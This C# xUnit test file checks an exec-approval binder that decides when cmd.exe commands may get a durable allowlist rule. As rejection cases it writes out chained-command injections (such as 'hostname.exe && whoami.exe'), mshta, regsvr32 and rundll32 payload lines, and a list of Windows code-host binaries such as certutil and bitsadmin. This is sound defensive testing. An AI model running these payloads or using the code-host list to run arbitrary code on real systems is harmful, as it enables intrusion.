using System;
using System.Diagnostics;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;
using OpenClaw.Shared.Commands;
using OpenClaw.Shared.ExecApprovals;
using Xunit;

namespace OpenClaw.Shared.Tests;

public class ExecReusableCommandBinderTests
{
    [Fact]
    public void CanonicalCmdHostname_BindsResolvedExecutable()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "hostname.exe"],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        Assert.True(Path.IsPathFullyQualified(bound!.Argv[0]));
        Assert.EndsWith("hostname.exe", bound.Argv[0], StringComparison.OrdinalIgnoreCase);
        Assert.Equal(bound.Resolution.ResolvedPath, bound.Pattern);
    }

    [Fact]
    public void CanonicalCmdQuotedLiteralArgument_DoesNotBind()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "where.exe \"hello world\""],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("hostname.exe | findstr.exe host")]
    [InlineData("hostname.exe && whoami.exe")]
    [InlineData("hostname.exe > output.txt")]
    [InlineData("hostname%COMSPEC%.exe")]
    [InlineData("hostname.exe ^& whoami.exe")]
    [InlineData("(hostname.exe)")]
    [InlineData("hostname.exe \"unterminated")]
    public void DynamicOrAmbiguousCmdPayload_DoesNotBind(string payload)
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("dir")]
    [InlineData("echo hello")]
    public void CmdBuiltin_DoesNotBind(string payload)
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("cmd.exe", "/c", "hostname.exe")]
    [InlineData("cmd.exe", "/d", "/c", "hostname.exe")]
    public void NoncanonicalCmdCarrier_DoesNotBind(params string[] command)
        => Assert.Null(ExecReusableCommandBinder.TryBind(command, cwd: null, env: null));

    [Theory]
    [InlineData(" /d ", "/s", "/c")]
    [InlineData("/d", " /s ", "/c")]
    [InlineData("/d", "/s", " /c ")]
    public void PaddedCmdSwitch_DoesNotBind(string d, string s, string c)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", d, s, c, "hostname.exe"],
            cwd: null,
            env: null));

    [Fact]
    public void DirectInterpreter_DoesNotBind()
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/c", "hostname.exe"],
            cwd: null,
            env: null));

    [Fact]
    public void NonexistentRelativeExecutable_DoesNotBind()
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            [@".\future-tool-that-does-not-exist.exe"],
            cwd: Path.GetTempPath(),
            env: null));

    [Fact]
    public void TransparentEnvPayload_DoesNotBind()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "env hostname.exe"],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("env FOO=bar hostname.exe")]
    [InlineData("env -i hostname.exe")]
    [InlineData("env --unknown hostname.exe")]
    public void ModifiedOrAmbiguousEnvPayload_DoesNotBind(string payload)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null));

    [Fact]
    public async Task AcceptedSpaceGrammar_MatchesRealCmdChildArgv()
    {
        var host = FindTestHostExecutable();
        var payload = $"{host} --echo-args alpha beta value=three";
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        var throughCmd = await RunAndReadArgsAsync(
            "cmd.exe",
            ["/d", "/s", "/c", payload]);
        var direct = await RunAndReadArgsAsync(
            bound!.Argv[0],
            bound.Argv.Skip(1).ToArray());

        Assert.Equal(["alpha", "beta", "value=three"], throughCmd);
        Assert.Equal(throughCmd, direct);
    }

    [Fact]
    public async Task AcceptedTabGrammar_MatchesRealCmdChildArgv()
    {
        var host = FindTestHostExecutable();
        var payload = $"{host}\t--echo-args\talpha\tbeta";
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        var throughCmd = await RunAndReadArgsAsync(
            "cmd.exe",
            ["/d", "/s", "/c", payload]);
        var direct = await RunAndReadArgsAsync(
            bound!.Argv[0],
            bound.Argv.Skip(1).ToArray());

        Assert.Equal(["alpha", "beta"], throughCmd);
        Assert.Equal(throughCmd, direct);
    }

    [Fact]
    public void QuotedExecutableToken_DoesNotBind()
    {
        var host = FindTestHostExecutable();
        Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", $"\"{host}\" --echo-args alpha"],
            cwd: null,
            env: null));
    }

    [Fact]
    public void TrailingBackslash_DoesNotBind()
    {
        var host = FindTestHostExecutable();
        Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", $"{host} --echo-args tail\\"],
            cwd: null,
            env: null));
    }

    [Fact]
    public void NonCmdWhitespace_DoesNotBind()
    {
        var host = FindTestHostExecutable();
        Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", $"{host}\u00A0--echo-args"],
            cwd: null,
            env: null));
    }

    [Fact]
    public void CmdEchoSuppressionPrefix_DoesNotBind()
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "@hostname.exe"],
            cwd: null,
            env: null));

    [Theory]
    [InlineData("mshta.exe https://example.invalid/payload.hta")]
    [InlineData("regsvr32.exe /s payload.dll")]
    [InlineData("rundll32.exe payload.dll,EntryPoint")]
    public void WindowsCodeHost_DoesNotBind(string payload)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null));

    [Fact]
    public void TabDelimitedLiteralArguments_Bind()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "where.exe\thello"],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        Assert.Equal("hello", bound!.Argv[1]);
    }

    // ── Multi-element carrier tails ───────────────────────────────────────────
    // Upstream approval fixtures send the command text already tokenized across
    // several argv elements, for example
    // ["cmd.exe","/d","/s","/c","echo","SAFE&&whoami"]. A binder that only accepts
    // a single pre-joined tail element silently refuses those, which is exactly the
    // allowlist failure this work is meant to fix.

    [Fact]
    public void MultiElementCarrierTail_Binds()
    {
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "where.exe", "hello"],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        Assert.EndsWith("where.exe", bound!.Argv[0], StringComparison.OrdinalIgnoreCase);
        Assert.Equal("hello", bound.Argv[1]);
    }

    [Fact]
    public void MultiElementCarrierTail_WithShellOperator_DoesNotBind()
    {
        // The upstream fixture shape. It must stay unbindable: the payload is a
        // compound command, and `echo` is a cmd builtin.
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "echo", "SAFE&&whoami"],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Theory]
    [InlineData("hello world")]
    [InlineData("hello\tworld")]
    [InlineData("\"hello\"")]
    public void MultiElementCarrierTail_NonReconstructibleElement_DoesNotBind(string trailing)
    {
        // A space join cannot recover the original process-creation quoting, so the
        // binder must refuse rather than authorize a different command than the one
        // cmd.exe would run.
        var bound = ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", "where.exe", trailing],
            cwd: null,
            env: null);

        Assert.Null(bound);
    }

    [Fact]
    public void AbsolutePathCmdCarrier_Binds()
    {
        var cmdPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.System),
            "cmd.exe");
        Assert.True(File.Exists(cmdPath));

        var bound = ExecReusableCommandBinder.TryBind(
            [cmdPath, "/d", "/s", "/c", "hostname.exe"],
            cwd: null,
            env: null);

        Assert.NotNull(bound);
        Assert.EndsWith("hostname.exe", bound!.Argv[0], StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void UntrustedCmdCopyCarrier_DoesNotBindInnerExecutable()
    {
        // A cmd.exe copy in a writable directory can ignore its arguments and run
        // anything, so it must never be looked through: binding against the inner
        // executable would show the operator a trusted path while the untrusted
        // outer image is what an allow-once actually launches.
        var dir = Directory.CreateDirectory(
            Path.Combine(Path.GetTempPath(), "openclaw-untrusted-cmd-" + Guid.NewGuid().ToString("N"))).FullName;
        try
        {
            var rogueCmd = Path.Combine(dir, "cmd.exe");
            File.Copy(
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe"),
                rogueCmd);

            var bound = ExecReusableCommandBinder.TryBind(
                [rogueCmd, "/d", "/s", "/c", "hostname.exe"],
                cwd: null,
                env: null);

            Assert.Null(bound);
        }
        finally
        {
            try { Directory.Delete(dir, recursive: true); } catch { }
        }
    }

    [Fact]
    public void UntrustedCmdCopy_IsNotTrustedCarrier_ButStillSerializesAsCmd()
    {
        var rogueCmd = Path.Combine(Path.GetTempPath(), "writable", "cmd.exe");

        // Trust side refuses to look through it.
        Assert.False(CanonicalCmdCarrier.IsTrustedCarrierExecutable(rogueCmd));
        Assert.False(CanonicalCmdCarrier.TryGetTrustedCanonicalPayload(
            [rogueCmd, "/d", "/s", "/c", "hostname.exe"], out _));

        // Serialization side still recognizes it, so the cmd-aware quoting is used.
        Assert.True(CanonicalCmdCarrier.IsCmdExecutable(rogueCmd));
        Assert.True(CanonicalCmdCarrier.TryGetCanonicalPayload(
            [rogueCmd, "/d", "/s", "/c", "hostname.exe"], out var payload));
        Assert.Equal("hostname.exe", payload);
    }

    [Theory]
    [InlineData("cmd")]
    [InlineData("cmd.exe")]
    [InlineData("CMD.EXE")]
    public void BareCmdName_IsTrustedCarrier(string executable)
    {
        Assert.True(CanonicalCmdCarrier.IsTrustedCarrierExecutable(executable));
    }

    [Fact]
    public void SystemDirectoryCmd_IsTrustedCarrier()
    {
        Assert.True(CanonicalCmdCarrier.IsTrustedCarrierExecutable(
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe")));
    }

    [Fact]
    public async Task AcceptedMultiElementTail_MatchesRealCmdChildArgv()
    {
        var host = FindTestHostExecutable();
        string[] carrier = ["cmd.exe", "/d", "/s", "/c", host, "--echo-args", "alpha", "beta"];
        var bound = ExecReusableCommandBinder.TryBind(carrier, cwd: null, env: null);

        Assert.NotNull(bound);
        var throughCmd = await RunAndReadArgsAsync("cmd.exe", carrier.Skip(1).ToArray());
        var direct = await RunAndReadArgsAsync(bound!.Argv[0], bound.Argv.Skip(1).ToArray());

        Assert.Equal(["alpha", "beta"], throughCmd);
        Assert.Equal(throughCmd, direct);
    }

    // ── cmd delimiters the tokenizer does not model ───────────────────────────
    // cmd also delimits the command-name token on ',', ';' and '='. The binder
    // splits only on space and tab, so these must fail closed (bind nothing) rather
    // than bind a token that differs from what cmd would execute.

    [Theory]
    [InlineData("where.exe,hello")]
    [InlineData("where.exe;hello")]
    [InlineData("where.exe=hello")]
    public void UnmodeledCmdDelimiter_FailsClosed(string payload)
        => Assert.Null(ExecReusableCommandBinder.TryBind(
            ["cmd.exe", "/d", "/s", "/c", payload],
            cwd: null,
            env: null));

    // ── PATHEXT targets that are not PE executables ───────────────────────────

    [Theory]
    [InlineData(".js")]
    [InlineData(".vbs")]
    [InlineData(".wsf")]
    [InlineData(".msc")]
    [InlineData(".com")]
    [InlineData(".bat")]
    [InlineData(".cmd")]
    public void NonExecutableExtensionTarget_DoesNotBind(string extension)
    {
        var directory = Directory.CreateTempSubdirectory("openclaw-binder-ext");
        try
        {
            var target = Path.Combine(directory.FullName, "probe" + extension);
            File.WriteAllText(target, "rem placeholder");

            Assert.Null(ExecReusableCommandBinder.TryBind([target], cwd: null, env: null));
        }
        finally
        {
            directory.Delete(recursive: true);
        }
    }

    [Fact]
    public void ExecutableExtensionTarget_Binds()
    {
        // Control for NonExecutableExtensionTarget_DoesNotBind: the same shape with
        // a .exe target must still bind, so the extension gate is what rejects.
        var directory = Directory.CreateTempSubdirectory("openclaw-binder-ext");
        try
        {
            var target = Path.Combine(directory.FullName, "probe.exe");
            File.Copy(FindTestHostExecutable(), target);

            var bound = ExecReusableCommandBinder.TryBind([target], cwd: null, env: null);

            Assert.NotNull(bound);
            Assert.EndsWith("probe.exe", bound!.Argv[0], StringComparison.OrdinalIgnoreCase);
            Assert.True(Path.IsPathFullyQualified(bound.Argv[0]));
        }
        finally
        {
            directory.Delete(recursive: true);
        }
    }

    // ── Expanded indirect code-host catalog ───────────────────────────────────

    [Theory]
    [InlineData("msbuild.exe")]
    [InlineData("installutil.exe")]
    [InlineData("regasm.exe")]
    [InlineData("regsvcs.exe")]
    [InlineData("msiexec.exe")]
    [InlineData("certutil.exe")]
    [InlineData("bitsadmin.exe")]
    [InlineData("wmic.exe")]
    [InlineData("forfiles.exe")]
    [InlineData("scriptrunner.exe")]
    [InlineData("pcalua.exe")]
    [InlineData("cmstp.exe")]
    [InlineData("odbcconf.exe")]
    [InlineData("presentationhost.exe")]
    [InlineData("msxsl.exe")]
    [InlineData("xwizard.exe")]
    [InlineData("hh.exe")]
    [InlineData("mavinject.exe")]
    [InlineData("csc.exe")]
    [InlineData("vbc.exe")]
    public void ExpandedWindowsCodeHost_IsNotDurablyBindable(string host)
    {
        // These select the code they run from their arguments, so a durable rule on
        // the executable path alone does not constrain what later runs. Verified at
        // the classification layer because most are not present on every host.
        Assert.True(
            ExecCommandToken.IsIndirectCommandHost(host),
            $"{host} must be treated as an indirect command host.");
    }

    private static string FindTestHostExecutable()    {
        var current = new DirectoryInfo(AppContext.BaseDirectory);
        while (current is not null
            && !Directory.Exists(Path.Combine(current.FullName, "tests")))
        {
            current = current.Parent;
        }

        Assert.NotNull(current);
        var configuration = new DirectoryInfo(AppContext.BaseDirectory)
            .Parent?.Name;
        Assert.False(string.IsNullOrWhiteSpace(configuration));
        var path = Path.Combine(
            current!.FullName,
            "tests",
            "OpenClaw.Shared.TestHost",
            "bin",
            configuration!,
            "net10.0",
            "OpenClaw.Shared.TestHost.exe");
        Assert.True(File.Exists(path), $"Argument test host was not built: {path}");
        return path;
    }

    private static async Task<string[]> RunAndReadArgsAsync(
        string executable,
        IReadOnlyList<string> arguments)
    {
        var startInfo = new ProcessStartInfo(executable)
        {
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        foreach (var argument in arguments)
            startInfo.ArgumentList.Add(argument);

        using var process = Process.Start(startInfo);
        Assert.NotNull(process);
        var stdout = await process!.StandardOutput.ReadToEndAsync();
        var stderr = await process.StandardError.ReadToEndAsync();
        await process.WaitForExitAsync();
        Assert.True(
            process.ExitCode == 0,
            $"Process failed with exit {process.ExitCode}: {stderr}");
        return JsonSerializer.Deserialize<string[]>(stdout.Trim())
            ?? throw new InvalidOperationException("Argument test host returned invalid JSON.");
    }
}
